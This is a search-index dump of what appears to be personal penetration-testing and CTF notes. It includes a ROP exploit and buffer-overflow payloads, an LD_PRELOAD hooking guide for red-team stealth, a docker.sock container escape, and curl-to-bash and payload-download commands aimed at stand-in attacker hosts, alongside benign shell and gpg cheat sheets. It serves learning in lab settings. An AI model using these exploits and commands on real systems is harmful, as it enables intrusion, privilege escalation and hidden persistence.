)\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/case-studies/basic-rop/#pwntools-variant","title":"pwntools variant","text":"<p>produces a stable interactive shell</p> <pre><code>#!/usr/bin/python\nfrom pwn import *\n\nbinary = ELF( \"./rop\" )\nproc = process( \"./rop\" )\n\n# p64() does little endian packing and addr normalization\npop_rdi_ret = p64( 0x000055555555522b )\nbin_sh_str = p64( 0x7ffff7f6c882 )\nlibc_system = p64( 0x7ffff7e1d860 )\n\nrop = b'A'*104\nrop += pop_rdi_ret\nrop += bin_sh_str\nrop += libc_system\n\nproc.sendline( rop )\nproc.interactive()\n\n# references\n# \"\"\"\n# https://anee.me/advanced-rop-techniques-16fd701909b5\n# https://youtu.be/1MDqn1kBHQM\n# \"\"\"\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/case-studies/index-of_buffer-overflow_case-studies/","title":"Index of buffer overflow case studies","text":"<ul> <li>pico_ctf_bo2</li> <li>basic-rop</li> </ul>"},{"location":"binary_exploitation/buffer_overflow/case-studies/pico_ctf_bo2/","title":"pico_ctf_bo2","text":"<ul> <li> <p>pico ctf BUFFER OVERFLOW 2</p> </li> <li> <p>https://www.youtube.com/watch?v=eJ0FmCfD-1g&amp;ab_channel=JohnHammond</p> </li> </ul> <p>above video was used for hint for the \"crafted frame requiring RIP\" bit</p> <p>interesting numbers</p> <pre><code>python2 -c \"print('A'*108)\" | ./vuln\n\n\npython2 -c \"print('A'*107+'XXXXY' + '\\x96\\x92\\x04\\x08' +'\\x0d\\xf0\\xfe\\xca'  )\" | ./vuln\n\n\n\nworking RIP ovewrite\npython2 -c \"print('A'*112 + '\\x96\\x92\\x04\\x08' +  '\\x0d\\xf0\\x0d\\xf0' +'\\x0d\\xf0\\xfe\\xca'  )\" | ./vuln \n\n\n# still working rip\n# now the \"args\" are at lower mem addresses on the stack\npython2 -c \"print('A'*104 + '\\x0d\\xf0\\xfe\\xca' + '\\x0d\\xf0\\x0d\\xf0' + '\\x96\\x92\\x04\\x08'  )\" | ./vuln\n\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/case-studies/pico_ctf_bo2/#solution","title":"solution","text":"<p>working remote payload</p> <pre><code>python2 -c \"print('A'*112 + '\\x9a\\x92\\x04\\x08' + 'CCCC' +'\\x0d\\xf0\\xfe\\xca'  +'\\x0d\\xf0\\x0d\\xf0'  )\" | nc saturn.picoctf.net 52463\n</code></pre> <p>explanation of payload</p> <pre><code>first we fill the buffer, clobber EBP for current frame with A\nnext we write a new RET address onto the saved rip '\\x9a\\x92\\x04\\x08' \n\nUnlike other buffer overflows I have done WE NEED  A STACK FRAME\n    this is because we are going to pass arguments to the function that we jump to\n    a stack frame EXPECTS\n        locals\n        saved eIP\n        then arguments\n    we build a stack frame\n        part of the ret is to pop the above into eIP\n        therefore at point of our overflow we need to provide the saved eIP for our frame we are buiding\n            it doesnt have to be legitimate\n            it only needs to be legitimate if we want to do a 2nd return/jump\n            thus we can use 'CCCC'\n        below our crafted saved eIP we put the arguments to our function call\n        first arg is at lowest address (seemingly backward order from our theory, but ignore for now)\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/case-studies/pico_ctf_bo2/#lessons-learnt","title":"lessons learnt","text":"<pre><code>struct.pack('&lt;I', 0x08049296)\npython2 -c \"print('A'*112 + '\\x9a\\x92\\x04\\x08' + 'CCCC' +'\\x0d\\xf0\\xfe\\xca'  +'\\x0d\\xf0\\x0d\\xf0'  )\" \n</code></pre> <p>python payloads are best generated with python2, python3 tries to encode it and ruins it <code>struct.pack</code> will little endian encode a hex integer for you python payloads can be printed to terminal, they can be copy pasted you just have to trust they are there (because they are)</p>"},{"location":"binary_exploitation/shared-library-highjacking/index-of_shared-library-hijacking/","title":"Index of shared library hijacking","text":"<ul> <li>linux-shared-objects</li> </ul>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/","title":"LD_PRELOAD-function-hooking","text":""},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#intro-and-description","title":"intro and description","text":""},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#dynamic-linking","title":"dynamic linking","text":"<p>Dynamically linked binaries link together numerous shared libraries at execution time in order to extend functionality. The libraries that get linked to our binary are present in memory during execution. For example, a binary that writes files does not need to implement the API required to request those system calls. Instead, we can dynamically link libc, <code>/lib/i386-linux-gnu/libc.so.6</code> to gain access to the <code>write()</code> api. </p>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#implementation","title":"implementation","text":"<p>When a <code>write()</code> call is done by the binary, it looks for first instance of the <code>write</code> symbol in the shared objects that have been loaded into memory. Using the found address, it prepares the arguments and executes the function at the found address.  Execution flow then returns to the main binary. </p>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#function-hooking","title":"function hooking","text":"<p>You may have noticed in the implementation section that in calling the <code>write()</code> function, we search for the first instance of a symbol. If we can affect the order that the shared libraries are loaded into memory, we can replace the implementation of the <code>write()</code> function with our own customized one by placing it at a lower address. </p> <p>This can be done in many ways, but our focus will be on <code>LD_PRELOAD</code> environment variable and the file <code>/etc/ld.so.preload</code>. Due to the<code>/etc/ld.so.preload</code> file having a system-wide effect, it is of particular interest to red team operatives looking to improve their on-target OPSEC. </p> <p>The <code>LD_PRELOAD</code> environment variable is a path to a shared object to be loaded before all other shared objects. By writing a custom shared object that contains the symbol <code>write</code>, we can replace the implementation of libc's <code>write</code> with our own. It is even possible to reference libc's implementation of <code>write</code> to ensure that the typical user experience is unaffected by our function hooking. </p> <p>The file <code>/etc/ld.so.preload</code> is a  whitespace-seperated list of fully qualified paths to shared objects to be loaded before any others. In the event of the <code>/etc/ld.so.preload</code> file and <code>LD_PRELOAD</code> environment variable both being used, the environment variable is given precedence. </p> <p>This <code>/etc/ld.so.preload</code> file is not commonly found on systems and is usually only deployed as a temporary emergency workaround. The presence of this file may indicate compromise or tampering. This is of particular importance to red team operatives who need to practice on-target OPSEC. If operatives are going to be hooking functions, then they should also be implementing logic to mask their custom shared objects and the <code>/etc/ld.so.preload</code> file left on the disk. </p>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#hooking-procedure","title":"hooking procedure","text":""},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#write-a-shared-object-in-c","title":"write a shared object in C","text":"<p>The shared object we write can use just about whatever we want in terms of <code>#include</code> and logic. The following requirement must be satisified in order to successfully hook a library function:</p> <ol> <li>the function signature of our custom function match signature of the library function</li> <li>the return type of our custom function must match the return type of the library function</li> </ol> <p>Failure to do so can create errors which result in OPSEC failures or program crashes.</p> <p>It is possible to introduce logic which defers to the original library function by using:</p> <ol> <li><code>#include &lt;dlfcn.h&gt;</code></li> <li>a function pointer, we will call <code>lib_fucntion</code> in this document. Mimic the function signature and return type when declaring the function pointer</li> <li><code>lib_fucntion = dlsym(RTLD_NEXT, \"write\")</code>, to get the address of the next occurrence of the symbol. In this case we are grabbing the address of the <code>write</code> symbol in the original library.</li> </ol> <p>With that setup, whenever we want to defer functionality to the original libary implementaiton we can call <code>lib_function(arg1,arg2,arg3)</code>.</p>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#compiling-and-setting-the-preload","title":"compiling and setting the preload","text":"<pre><code>gcc -ldl custom_lib.c -fPIC -shared -D_GNU_SOURCE -o OPSEC_SENSITIVE_NAME.so\n</code></pre> <p>We can set the preload through <code>LD_PRELOAD</code> environment variables or in the <code>/etc/ld.so.preload</code> file</p> <pre><code>export LD_PRELOAD=/path/to/OPSEC_SENSITVE_NAME.so\n</code></pre>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#considerations","title":"considerations","text":"<ul> <li>64bit vs 32bit: some libraries handle these seperately, if you are hooking a function that does so then you must write logic to handle both cases</li> <li>red team operatives should include hooks for library calls used by <code>/bin/ls</code> and <code>/bin/find</code> at a minimum to hide from basic detection methods</li> <li>custom shared objects should be written to disk in a OPSEC sensitve way, e.g. to appropriate directory for the operating system such as <code>/usr/lib</code> or <code>/lib</code></li> </ul>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/#extensions","title":"extensions","text":"<p>The careful study of library functions and how common utilities interact with them can result in creative opportunites for</p> <ul> <li>persistence</li> <li>on-target OPSEC</li> <li>intelligence gathering</li> <li>information exfiltration</li> </ul>"},{"location":"binary_exploitation/shared-library-highjacking/linux-shared-libs/index-of_linux-shared-libs/","title":"Index of linux shared libs","text":"<ul> <li>LD_PRELOAD-function-hooking</li> </ul>"},{"location":"docker/index-of-docker/","title":"Index of docker","text":"<ul> <li>index-of-docker_escapes</li> </ul>"},{"location":"docker/docker_escapes/index-of-docker_escapes/","title":"Index of docker escapes","text":"<ul> <li>via-docker-socket</li> </ul>"},{"location":"docker/docker_escapes/via-docker-socket/","title":"via-docker-socket","text":""},{"location":"docker/docker_escapes/via-docker-socket/#briefing","title":"briefing","text":"<p>Encountered a docker container which had the <code>docker.sock</code> included in the mounted volumes. This allowed for escape of the counter by interacting with the socket via <code>curl</code> requests. </p> <ul> <li>lab environment:<ul> <li>https://tryhackme.com/room/linuxagency</li> </ul> </li> <li>Procedure was created by studying this blog:<ul> <li>https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</li> </ul> </li> </ul>"},{"location":"docker/docker_escapes/via-docker-socket/#procedure","title":"procedure","text":"<p>throughout this section, edit the <code>~/path/to/docker.sock</code> as needed.</p>"},{"location":"docker/docker_escapes/via-docker-socket/#preparations","title":"preparations","text":"<p>We need two things prepared:</p> <ol> <li>we should escalate to the root user within the container we are trapped in</li> <li>we need to serve a statically linked copy of <code>socat</code> to our target</li> <li>we need to know what docker images are available on the target in order to prepapre the <code>containers.json</code> file. If the target has internet access, alpine is a nice image to pull down due to its small size</li> </ol> <p>If our user does not have access to the docker binary to run <code>docker images</code>, we may still have permission to interact with the docker api directly via <code>curl</code>. </p> <p>The following lists available images. </p> <pre><code>curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json\n</code></pre> <p>Pick an available image, in our case <code>mangoman</code>, and prepare the <code>container.json</code> file.</p> <pre><code>echo -e '{\"Image\":\"mangoman\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/etc/\",\"Target\":\"/host_etc\"}]}' &gt; container.json\n</code></pre> <p>Take note of the mounts in the above command, these can be modified to include the root file system. e.g. <code>\"Source\":\"/\", \"Target\":\"/pwned\"</code>. With access to the root file system of the host, arbitrary read/write is possible, therefore full compromise is achieved.</p>"},{"location":"docker/docker_escapes/via-docker-socket/#start-our-malicious-container","title":"start our malicious container","text":"<p>We can create a container based off of our <code>container.json</code> with:</p> <pre><code>curl -XPOST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock -d \"$(cat container.json)\" http://localhost/containers/create\n</code></pre> <p>The above command yields a response on <code>stdout</code> from the docker daemon. The response has the four digit hex docker id of the container we created. This id is needed for the remaining steps.</p> <p>At this point, the container is not running yet. We can start it using the docker id by:</p> <pre><code>curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/start\n</code></pre> <p>Note that the above command produces no output on the terminal.</p>"},{"location":"docker/docker_escapes/via-docker-socket/#request-shell-from-docker-socket","title":"request shell from docker socket","text":"<p>With our container running, we can now request a shell via the docker api by interacting with the <code>docker.sock</code> using <code>socat</code>. Any tool that allows manual crafting of HTTP headers will work, <code>socat</code> is used for reliability.</p> <p>Open a connection using <code>socat</code>: </p> <pre><code>./socat - UNIX-CONNECT:/var/run/docker.sock\n</code></pre> <p>Now we can modify HTTP header manually. I recommend preparing the following payload, then copy pasting it into the terminal.</p> <pre><code>POST /containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1\nHost:\nConnection: Upgrade\nUpgrade: tcp\n\n\n</code></pre> <p>Note the following</p> <ul> <li>the two line breaks in the above are necessary to make the HTTP request valid</li> <li>the <code>4_DIGIT_DOCKER_ID_FROM_ABOVE</code> must be replaced </li> </ul> <p>Returns a root shell to us! We are root user of our custom container. Our custom container has the host file system mounted on it. Thus, we have full control of the host.</p>"},{"location":"docker/docker_escapes/via-docker-socket/#conclusion","title":"conclusion","text":"<p>The procedure detailed here is not an exhaustive description of what is possible from this misconfiguration. In general, if it can be done through the docker API then it can be done through similar methods as detailed above. This makes sense, as the <code>docker.sock</code> is pointed at localhost, which is within the \"walled garden\" and not subject to robust security standards. This escape vector can be eliminated by ensuring that the <code>docker.sock</code> is never accidentally mounted when containers are deployed. A redundancy measure could be implemented that uses the <code>find</code> command in all perspective mounts and halts container deployment in the event of <code>docker.sock</code> being present.</p>"},{"location":"firewall_evasion/firewall_evasion-home/","title":"general firewall evasion tactics","text":"<ul> <li>encode the payload (for pwsh -enc command or b64 -d)</li> <li>try funny port</li> <li>try normal ports</li> <li>ipv6 to evade lazy filtering rules</li> </ul>"},{"location":"firewall_evasion/firewall_evasion-home/#encoding-payloads-for-windows","title":"encoding payloads for windows","text":"<p>when encoding before base64 ing the payload; allows <code>pwsh -enc PAYLOAD</code></p> <pre><code>iconv -t UTF-16LE\n</code></pre>"},{"location":"firewall_evasion/index-of-firewall_evasion/","title":"Index of firewall evasion","text":"<ul> <li>firewall_evasion-home</li> </ul>"},{"location":"freedom_of_movement/bash_isms/","title":"bash_isms","text":""},{"location":"freedom_of_movement/bash_isms/#essentials","title":"essentials","text":"<p>bash default vars</p> <pre><code>echo $?      # gives error code of most recently run command\n</code></pre> <p>keystrokes and hotkeys</p> <pre><code>alt+.  # hotkey for use last argument\ncd -   # cd to last working dir\nctrl+r # reverse search previous cmds, press multiple times to see next result\n</code></pre> <p>for loop</p> <pre><code>for i in {0..100}; do  CMD; done\nalso works for command execs: \nfor i in $(cat wordlist.txt); do curl http://IP/$i; done\n</code></pre> <p>Brace expansion; similar to * operator on iterables in python (python implentation of explode)</p> <pre><code>cat {file1,file2,file3}         ; will cat those file\n\n# useful for \nmkdir dir{1..4} dirA{1..8}\nwget http://MY_IP/{file1,file2}     \n# could even do a loop style brace expansion of numbers or letters here\n# such as {1..2}\n\n# other examples\necho {a..z}\necho {1..-5}\n</code></pre>"},{"location":"freedom_of_movement/bash_isms/#advanced","title":"advanced","text":"<p>redirection</p> <pre><code># can be used to issue commands into a binary\n./BINARY &lt; exploit.txt\n# exploit.txt must contain 1 input per line\n\n# can wget a bash script and pipe it into bash to execute a hosted script\nwget http://IP/SCRIPT | bash\n\n# can run linpeas without touching disk\nbash &lt; &lt;(curl http://attacker.com/LINPEAS)\n</code></pre> <p>file descriptor; a note on <code>&lt;(curl http://attacker.com/LINPEAS)</code></p> <pre><code># this yields a file descriptor, it is NOT redirection\n# file descriptors can loosely be thought of like pointers\n&lt;(curl http://attacker.com/LINPEAS)\n\n# the following works because bash can read files\nbash &lt;(curl http://attacker.com/LINPEAS)\n\n# this can be demonstrated with with the tr command\n# tr does not have the ability to read files\n#\n# the following fails\ntr -cd '[[:space:]]' &lt;(seq 1 10)\n# the following succeeds\ntr -cd '[[:space:]]' &lt; &lt;(seq 1 10)\n\n# reference\nhttps://askubuntu.com/questions/564380/alternative-for-pipe-operator\n</code></pre> <p>advanced redirection, i am calling this bidirection</p> <pre><code>while read -r line; echo \"prefix-$line\";done &lt; wordlist &gt; outfile\n</code></pre> <p>use ENV vars in your bash scripting by: (unverified)</p> <pre><code>${ENV_VARIABLE}         ; perhaps un-exported?\n\nsimilar to $my_var\n</code></pre>"},{"location":"freedom_of_movement/bash_isms/#other-notes","title":"other notes","text":"<p>a note on mkdir; creating a path of dirs</p> <pre><code>mkdir -p dir1/dir2/dir3\n</code></pre> <p>follow script directory traversal, potent for \"day-start\" and \"new project\" scripts. From a systems programming, perspective it is as if the <code>fork()</code> or <code>clone()</code> is not called (UNVERIFIED). The work is done by the parent itself. </p> <pre><code>. script.sh\n</code></pre> <p>file creation and \"done with arguments\", bad characters in file names</p> <pre><code># When trying to create malicious filenames use:\n# E.g. when doing tar GTFO bins priv esc \ntouch -- ';bash -p' \n\n# alternatively, echo into malicous filenames\necho '' &gt; ';bash -p' \n</code></pre>"},{"location":"freedom_of_movement/cmdline_analysis/","title":"cmdline_analysis","text":"<p>tricks &amp; techninques for analyzing folders, volumes, source codes via cmd line</p>"},{"location":"freedom_of_movement/cmdline_analysis/#hashing-algs","title":"hashing algs","text":"<p>Hashing algs can be used to identify unique files inside a directory.</p> <ol> <li>compile lists of md5sums of each file in dir (assuming multiple trees)</li> <li>use diff -y TREE_SUMS_A TREE_SUMS_B to compare<ol> <li>lists must be sorted</li> </ol> </li> <li>the goal is to find unique md5sums between the two trees</li> </ol>"},{"location":"freedom_of_movement/cmdline_analysis/#specific-tools","title":"specific tools","text":""},{"location":"freedom_of_movement/cmdline_analysis/#diff","title":"diff","text":"<p>tool made to show differences between files</p> <p>e.g. side by side comparison</p> <pre><code>diff -y file_a file_b | less -S\n</code></pre>"},{"location":"freedom_of_movement/cmdline_analysis/#watch","title":"watch","text":"<p>tool mad to update STDOUT based on an interval</p> <p>e.g. monitor a directory for changes every second</p> <pre><code>watch -n 1 ls -al /dev/shm\n</code></pre>"},{"location":"freedom_of_movement/docker/","title":"Docker","text":"<p>Use the docker slugs to refer to containers/images to avoid docker trying to resolve any ambiguities. See example of docker pulling latest despite local image available. </p>"},{"location":"freedom_of_movement/docker/#create-new-docker-context","title":"Create New Docker Context","text":"<pre><code>docker context create --docker host=tcp://10.10.10.10:2375 CONTEXT_LABEL\n</code></pre> <p>See other connection methods in the docks:</p> <ul> <li>docker context docs</li> </ul>"},{"location":"freedom_of_movement/docker/#list-docker-contexts","title":"List Docker Contexts","text":"<pre><code>docker context ls\n</code></pre>"},{"location":"freedom_of_movement/docker/#switch-docker-context","title":"Switch Docker Context","text":"<pre><code>docker context use LABEL_OF_MY_CONTEXT\n</code></pre>"},{"location":"freedom_of_movement/docker/#exec-interactive-in-container","title":"Exec Interactive in Container","text":"<pre><code>docker exec -it HASH_SLUG  sh\n</code></pre>"},{"location":"freedom_of_movement/docker/#list-containers","title":"List Containers","text":"<pre><code>docker ps\n</code></pre>"},{"location":"freedom_of_movement/docker/#list-images-available","title":"List images available","text":"<pre><code>docker ps\n</code></pre>"},{"location":"freedom_of_movement/find_command/","title":"The Find Command","text":""},{"location":"freedom_of_movement/find_command/#overview","title":"overview","text":"<p>linux find command frequent useful commands</p> <pre><code>find LOCATION -type f -iname PATTERN -perm -2000 -o -4000 2&gt;/dev/null\nother logics possible such as:\n    -a                                      ; AND operator\n    -o                                      ; OR operator\n    -perm /u=s              ; files with suid bit active\n    -exec CMD {} \\;         ; {} is the output of find, similar to piping, one per line\n    -exec CMD {} \\+                         ; concatenates output, results in 1 cmd being exec instead of each\n    considering piping into xargs -p -n     ; for prompt &amp;&amp; 1 per line\n</code></pre>"},{"location":"freedom_of_movement/find_command/#leverage-timestamps","title":"leverage timestamps","text":"<p>aka bookend search; time period search; newer modified time</p> <pre><code>find / -newermt \"YYYY-mm-dd\" -newermt \"YYYY-mm-dd\" 2&gt;/dev/null -ls\n</code></pre>"},{"location":"freedom_of_movement/find_command/#lazy-ls","title":"lazy ls","text":"<p>list a dir, recursively; possibly the best flag</p> <pre><code>find . -ls 2&gt;/dev/nulll\n</code></pre>"},{"location":"freedom_of_movement/find_command/#permission-bits","title":"permission bits","text":"<p>the classic</p> <pre><code>find / -type f -perm -2000 -o -perm -4000 2&gt;/dev/null       ; note the - prefix on the perm_num, this means \"at least\"\n</code></pre>"},{"location":"freedom_of_movement/find_command/#users-groups-attributes","title":"users, groups, attributes","text":"<p>targeted enumeration; lateral movement</p> <pre><code>find / -group GROUP_NAME\n</code></pre> <pre><code>find / -user USER_NAME\n</code></pre> <pre><code>find . -writeable   \n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/","title":"freedom of movement","text":""},{"location":"freedom_of_movement/freedom_of_movement/#less-command","title":"less command","text":"<p>for dealing with text wrapping/color codes issues from linpeas</p> <pre><code>less -S     ; deals with line wrapping\nless -r     ; deals with color issues\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#ssh","title":"ssh","text":"<p>access the ssh command &amp; ssh commands</p> <pre><code>~C                                          ; to enter the 'command' prompt\n-L  local_port:127.0.0.1:remote port        ; tunnels our traffic through ssh to access a service running on target localhost\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#text-manglingsearching-linux","title":"text mangling/searching linux","text":"<p>grep</p> <pre><code>grep -A4 -B4                ; show context lines 4 before and 4 after (example)\n\ngrep -v '/proc\\|sys\\|run'   ; select things which do NOT have {proc,sys,run}; notice we escape the | to get the 'or' sense\n\ngrep -oP \"http://[A-z]\"     ; pattern, only output match. non-useful example\n\ngrep -l                     ; output filenames instead of matchstrings\ngrep -f                     ; get patterns froma file, 1 per line\n</code></pre> <p>find</p> <pre><code>has an -ls flag             ; changes output format to look tabular, like ls\n</code></pre> <p>cut vs awk</p> <pre><code>use awk as often as possible; valuable tool; must get better at this\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#msf-framework","title":"MSF Framework","text":"<p>searchsploit basics</p> <pre><code>searchsploit SEARCH_TERM        ; search the local exploitDB\nsearchsploit -x PATH            ; examine an exploit\nserachsploit -m PATH            ; make a copy of the exploit in current dir\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#searching-a-filesystem","title":"searching a filesystem","text":"<p>windows powershell, recreating linux find, PS output is always an object, these are SLOW commands</p> <pre><code>get-childitem | where-object -property PROP_NAME -imatch SEARCH_TERM\nget-childitem | select-string -pattern SEARCH_TERM\nGet-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Path C:\\* | FILTERING\n    where-object -property PROP_NAME -imatch  SEARCH_TERM           ; only checks file names\n    or\n    select-string -pattern SEARCH_TERM                              ; checks file contents as well\n</code></pre> <p>windows cmd.exe</p> <pre><code>findstr /c: \"Pattern\" *.md          ; finds 'Pattern' in all .md files in the directory\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#interacting-with-archives","title":"interacting with archives","text":"<p>types of archives</p> <pre><code>docx\nvhd         ; yes really\nzip, tar, gz \nwar         ; archive associated with tomcat website, contains a .jsp file which is like the php of a php site, its the scripting file\n</code></pre> <p>list archive contents without opening / without pass</p> <pre><code>7z l *.vhd      ; lists contents of the virtual hardrive archive, works for any type\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#dealing-with-heavy-syntax","title":"dealing with heavy syntax","text":"<p>js can be beautified</p> <pre><code>in web browser js tab\nweb apps accross internet ( BECAREFUL - NO SENSITIVE DATA)\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#json","title":"json","text":"<p>JSON can be heavy when the objects are large, <code>jq</code> can be used to cut up the objects and isolate the key-values that  are relevant</p> <pre><code>jq tool  # very useful commandline tool for beautifying/dealing with json returned from APIs\n</code></pre> <p>The double <code>|</code> may seem redundant, but it emphasizes what we are doing and minimizes the risk of making a syntax error in <code>jq</code>'s pipeline. To get keys of a <code>jq</code> output. </p> <pre><code>cat large-object.json  | jq '.' | jq 'keys'\n</code></pre> <p>Limit output to keys of a single JSON object. </p> <pre><code>cat large-object.json  | jq '.[0]' | jq 'keys'\n</code></pre> <p>Continue diving into objects by <code>.referencing</code> fields. If a sub object is encountered in a field, it may be opened with <code>[]</code> appended to the name of the field. </p> <pre><code>cat large-object.json  | jq '.[0].\"FIELD_NAME\".\"SUB_OBJECT\"[]' | jq 'keys'\n</code></pre>"},{"location":"freedom_of_movement/freedom_of_movement/#no-text-editor-available","title":"no text editor available","text":"<p>Use the <code>grep</code> and <code>sed</code> method. This can be explained in roughly 2 steps.</p> <ol> <li>use <code>grep -n</code> to output the line number, <code>x</code>, of whatever your pattern matches</li> <li>use <code>sed -i 'xs/FIND/REPLACE/'</code>, to make modifications in place. Note that <code>x</code> is the integer found in step1 and  the <code>-i</code> flag is necessary to write the changes.</li> </ol> <p>This works because <code>sed</code> is a line based text mangler. </p>"},{"location":"freedom_of_movement/freedom_of_movement/#interacting-with-tar-binary-","title":"interacting with tar binary -","text":"<p>tarballs, better zip files! GNU/Linux better archiving software</p>"},{"location":"freedom_of_movement/freedom_of_movement/#make-tarball","title":"make tarball","text":"<pre><code>tar -cjvf TARGET_NAME.tar.bz2  ~/path/to/uncompressed/target\n</code></pre> <ul> <li><code>-v</code> verbose</li> <li><code>-c</code> create</li> <li><code>-j</code> use bzip? if not bzip, then this is compression type</li> <li><code>-f</code> file name</li> <li>if the above fails, carefully consider using wildcards</li> </ul>"},{"location":"freedom_of_movement/freedom_of_movement/#extract-tarball","title":"extract tarball","text":"<p>prepare a temp directory, might clobber workind dir</p> <pre><code>tar -xjvf\n</code></pre> <ul> <li><code>-v</code> verbose</li> <li><code>-x</code> extract</li> <li><code>-j</code> use bzip? if not bzip, then this is compression type</li> <li><code>-f</code> file name</li> </ul>"},{"location":"freedom_of_movement/gpg/","title":"gpg","text":""},{"location":"freedom_of_movement/gpg/#gen-burner-keypair","title":"gen burner keypair","text":"<pre><code>gpg --generate-key\n</code></pre> <ul> <li>answer questions accordingly</li> </ul>"},{"location":"freedom_of_movement/gpg/#export-key-as-pem","title":"export key as pem","text":"<pre><code>gpg --armor  --export-secret-keys example@email.com &gt; identity.key\n</code></pre>"},{"location":"freedom_of_movement/gpg/#export-pub-as-pem","title":"export pub as pem","text":"<pre><code>gpg --armor  --export example@email.com &gt; identity.key.pub\n</code></pre>"},{"location":"freedom_of_movement/gpg/#encrypt-a-message","title":"encrypt a message","text":"<pre><code>gpg --armor -r recipient@email.com -e message.txt\n</code></pre>"},{"location":"freedom_of_movement/gpg/#decrypt-with-our-pubkey","title":"decrypt with our pubkey","text":"<pre><code>gpg -d tmp.txt.gpg \n</code></pre> <ul> <li>you will be prompted for the pass associated with the burner</li> </ul>"},{"location":"freedom_of_movement/gpg/#verify-signed-message","title":"verify signed message","text":"<pre><code>gpg --status-fd 1 --verify example.signed  \n</code></pre>"},{"location":"freedom_of_movement/gpg/#sign-a-message","title":"sign a message","text":"<pre><code>gpg -a  -s --default-key &lt;KEY_SLUG_FOR_SIGN&gt; message.txt\n</code></pre>"},{"location":"freedom_of_movement/index-of-freedom_of_movement/","title":"Index of freedom of movement","text":"<ul> <li>bash_isms</li> <li>find_command</li> <li>freedom_of_movement</li> <li>powershell_cheatsheet</li> <li>index-of-services</li> <li>serving_files</li> <li>index-of-software</li> <li>cmdline_analysis</li> <li>tmux</li> <li>vi_or_vim</li> <li>gpg</li> <li>docker</li> </ul>"},{"location":"freedom_of_movement/powershell_cheatsheet/","title":"PowerShell Movements","text":""},{"location":"freedom_of_movement/powershell_cheatsheet/#base64-encode","title":"base64 encode","text":"<pre><code>[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\"hello\"))\n</code></pre> <ul> <li>works for anything that returns the bytes object</li> </ul>"},{"location":"freedom_of_movement/powershell_cheatsheet/#base64-decode","title":"base64 decode","text":"<pre><code>$b64 = \"aGVsbG8=\"\n</code></pre> <pre><code>[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))\n</code></pre>"},{"location":"freedom_of_movement/powershell_cheatsheet/#pull-via-http","title":"Pull via HTTP","text":"<pre><code>Invoke-WebRequest -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe \n</code></pre> <pre><code>iwr -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe \n</code></pre>"},{"location":"freedom_of_movement/powershell_cheatsheet/#old-sheet","title":"Old Sheet","text":""},{"location":"freedom_of_movement/powershell_cheatsheet/#ps-cheats","title":"PS cheats","text":"<ul> <li>put paths in quotes, because windows is bad !</li> <li>get-Service NAME</li> <li>Measure-Object                                        ; for counting outputs</li> <li>remember you can pipe things!</li> <li>verb-noun</li> <li>outputs are objects; therefore get-member</li> <li>Objects have methods and Properties</li> <li>get-content                                                           ; will usually type/cat/ do something</li> <li>acl, get-acl                                                          ; shows permisions in current dir, such as owner ; ACCESS CONTROL LISTS</li> <li>CMDLET | get-member -MemberType Properties/Method                     ; gives information on available props/methods</li> <li>CMDLET | where-object -property PROP_NAME -operator OPERATOR_PARM     ;    filter output by my specification (always use match operator)</li> <li>CMDLET | select-object -property prop1, prop2, ...                    ;    limit output fields creates a new object</li> <li>dir env:                                                              ; display environment vars |  format-list Property-Name</li> </ul> <p>find command</p> <pre><code>get-childitem -force -recurse -path C:\\ -errorACtion SilentlyContinue -include *SEARCH_TERM*\nhttps://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ \n</code></pre> <p>grep equivalent; this will search entire filesystem</p> <pre><code>Get-ChildItem C:\\* -recurse | Select-String -pattern SEARCH_TERM\n</code></pre> <p>help/search availble actions</p> <pre><code>get-command *SEARCH_TERM*\nget-help    CMDLET\n</code></pre> <p>filtering outputs</p> <pre><code>Verb-Noun | Where-Object -Property PropertyName -operator Value\nVerb-Noun | Where-Object {$_.PropertyName -operator Value}          ; `$_` is an operator, iterates through every object passed (SYNTAX ERR?)\nVerb-Noun | Sort-Object\n</code></pre> <p>pull a shell &amp; execute; possibly dont need double quotes?</p> <pre><code>CMD.exe&gt;\"powershell.exe Invoke-WebRequest -Uri 